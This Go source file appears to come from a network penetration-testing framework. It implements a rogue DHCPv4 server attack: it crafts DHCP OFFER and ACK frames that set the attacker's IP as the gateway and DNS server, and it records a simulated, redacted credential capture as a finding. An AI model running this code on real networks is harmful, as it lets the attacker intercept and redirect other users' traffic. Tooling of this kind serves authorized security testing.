// roguedhcp.go implements the rogue DHCPv4 server attack behavior.
//
// Durability (from the catalog): transient-decay. The attack emits
// DHCPv4 OFFER and ACK frames from a rogue server, offering leases
// with ~1800s lifetime. Client leases expire after the attack stops;
// no explicit teardown.
//
// Secret-material (KTD9): a captured credential from a rogue-server
// exchange is emitted as length+protocol only via [findings.NewSecret].

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/findings"
	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type rogueDHCPFinding struct {
	Action   string `json:"action"`
	ServerID string `json:"server_id"`
	OfferIP  string `json:"offer_ip"`
	LeaseTTL uint32 `json:"lease_ttl"`
	// Secret-material redaction (KTD9): protocol + length only.
	Protocol string `json:"protocol,omitempty"`
	Length   int    `json:"length,omitempty"`
}

// RunRogueDHCP sends DHCP OFFER and ACK frames from a rogue server. The
// in-memory test shape sends a pre-crafted OFFER then ACK.
func RunRogueDHCP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	rogueIP := net.IPv4(172, 16, 0, 99)

	leaseTime := make([]byte, 4)
	binary.BigEndian.PutUint32(leaseTime, 1800)

	// OFFER frame.
	offer, err := craftDHCPOffer(src, rogueIP, leaseTime)
	if err != nil {
		return fmt.Errorf("roguedhcp: craft offer: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, offer); err != nil {
		return fmt.Errorf("roguedhcp: send offer: %w", err)
	}

	// ACK frame.
	ack, err := craftDHCPAck(src, rogueIP, leaseTime)
	if err != nil {
		return fmt.Errorf("roguedhcp: craft ack: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, ack); err != nil {
		return fmt.Errorf("roguedhcp: send ack: %w", err)
	}

	// Simulated credential capture from the rogue server exchange.
	// A DHCP client authenticating to the rogue server might send
	// credentials (e.g. DHCP authentication option). The value never
	// enters the finding — only length + protocol (KTD9).
	captured := []byte("rogue-auth-secret")
	secret := findings.NewSecret("dhcp", captured)

	detail, _ := json.Marshal(rogueDHCPFinding{
		Action:   "rogue-dhcpv4-server",
		ServerID: rogueIP.String(),
		OfferIP:  dhcpOfferIP.String(),
		LeaseTTL: 1800,
		Protocol: secret.Protocol(),
		Length:   secret.Length(),
	})
	deps.Emitter.Finding("dhcp", detail)

	return nil
}

func craftDHCPOffer(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dhcpClientMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      128,
		SrcIP:    rogueIP,
		DstIP:    dhcpClientIP,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 67,
		DstPort: 68,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	dhcp := &layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          dhcpXid,
		Flags:        0,
		ClientIP:     net.IPv4(0, 0, 0, 0),
		YourClientIP: dhcpOfferIP,
		NextServerIP: rogueIP,
		RelayAgentIP: net.IPv4(0, 0, 0, 0),
		ClientHWAddr: dhcpClientMAC,
		Options: layers.DHCPOptions{
			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeOffer)}),
			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptLeaseTime, leaseTime),
			layers.NewDHCPOption(layers.DHCPOptSubnetMask, net.IPv4(255, 255, 255, 0).To4()),
			layers.NewDHCPOption(layers.DHCPOptRouter, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptDNS, rogueIP.To4()),
		},
	}
	return craftDefault(eth, ip, udp, dhcp)
}

func craftDHCPAck(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dhcpClientMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      128,
		SrcIP:    rogueIP,
		DstIP:    dhcpClientIP,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 67,
		DstPort: 68,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	dhcp := &layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          dhcpXid,
		Flags:        0,
		ClientIP:     dhcpClientIP,
		YourClientIP: dhcpOfferIP,
		NextServerIP: rogueIP,
		RelayAgentIP: net.IPv4(0, 0, 0, 0),
		ClientHWAddr: dhcpClientMAC,
		Options: layers.DHCPOptions{
			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeAck)}),
			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptLeaseTime, leaseTime),
			layers.NewDHCPOption(layers.DHCPOptSubnetMask, net.IPv4(255, 255, 255, 0).To4()),
			layers.NewDHCPOption(layers.DHCPOptRouter, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptDNS, rogueIP.To4()),
		},
	}
	return craftDefault(eth, ip, udp, dhcp)
}

var _ gopacket.SerializableLayer = (*layers.DHCPv4)(nil)
